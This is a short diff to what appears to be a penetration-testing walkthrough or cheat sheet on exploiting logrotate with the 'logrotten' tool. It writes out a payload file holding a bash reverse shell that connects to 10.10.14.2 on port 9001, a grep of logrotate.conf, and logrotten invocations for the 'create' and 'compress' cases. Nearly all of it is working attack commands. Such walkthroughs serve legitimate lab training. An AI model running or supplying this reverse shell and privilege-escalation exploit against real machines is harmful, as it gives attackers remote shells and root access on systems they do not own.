@@ -457,14 +457,21 @@ cd logrotten
 gcc logrotten.c -o logrotten
 ```
 payload
-```
+```shell
 $ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
 ```
 before running the exploit, we need to determine which option logrotate uses in logrotate.conf.
-```
+```shell
 $ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
 ```
-In our case, it is the option: create. Therefore we have to use the exploit adapted to this function.
+
+```shell
+# If "create"-option is set in logrotate.cfg:
+./logrotten -p ./payloadfile /tmp/log/pwnme.log
+
+# If "compress"-option is set in logrotate.cfg:
+./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
+
 ```
-$ ./logrotten -p ./payload /tmp/tmp.log
-```
+
+
